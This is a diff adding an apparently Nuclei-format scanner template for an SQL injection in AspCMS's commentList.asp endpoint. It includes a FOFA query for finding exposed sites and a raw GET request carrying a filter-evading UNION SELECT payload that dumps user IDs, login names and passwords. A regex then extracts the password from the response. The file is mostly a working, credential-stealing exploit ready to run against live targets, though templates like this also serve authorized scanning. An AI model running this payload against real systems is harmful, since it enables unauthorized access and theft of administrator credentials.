@@ -1,0 +1,35 @@
+id: AspCMS-commentList-SQL
+
+info:
+  name: AspCMS commentList.asp SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa：app="ASPCMS"
+    AspCMS commentList.asp接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+    extractors:
+      - type: regex
+        name: password
+        group: 1
+        regex:
+          - "<div class=\"line2\">(.*?)</div>"
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code_1 == 200"
+          - "contains(body,'clistbox') && contains(body,'UserID,GroupID,LoginName,Password')"
+        condition: and
